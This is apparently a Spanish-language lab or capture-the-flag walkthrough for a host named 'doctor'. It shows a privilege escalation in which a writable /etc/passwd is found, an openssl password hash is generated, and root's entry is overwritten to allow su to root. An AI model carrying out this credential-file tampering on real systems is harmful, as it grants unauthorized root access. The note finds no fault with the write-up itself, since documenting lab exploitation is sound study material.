### Enumeration

#### Writable Files

```
find / -writable -type f 2>/dev/null |grep -viE "var|proc|sys|home"
```

![[Pasted image 20250705000505.png]]

```
admin@doctor:~$ ls -l /etc/passwd
```

![[Pasted image 20250705000531.png]]

El **usuario** **`admin`** dispone de **permisos de escritura** sobre el archivo **`/etc/passwd`**.
Mediante el **password** **`123456`** creo un **hash** con [openssl](https://linux.die.net/man/1/openssl)

```
admin@doctor:~$ openssl passwd -1 123456
```

![[Pasted image 20250705000702.png]]

```
$1$MPtnHmQZ$ndcxxjXBm23HwPkCRA8IU.
```

En la línea del **usuario** **`root`**, elimino la **`x`** y pego el **hash** previamente creado para que la validación del **password** se realice desde el archivo **`/etc/passwd`** en lugar del archivo **`/etc/shadow`**

```
admin@doctor:~$ cat /etc/passwd | grep root
```

![[Pasted image 20250705000907.png]]

```
admin@doctor:~$ nano /etc/passwd
admin@doctor:~$ grep root /etc/passwd
```

![[Pasted image 20250705001348.png]]

Me convierto en **usuario** **`root`**

```
su root
//Contraseña: 123456
id 
```

![[Pasted image 20250705001435.png]]
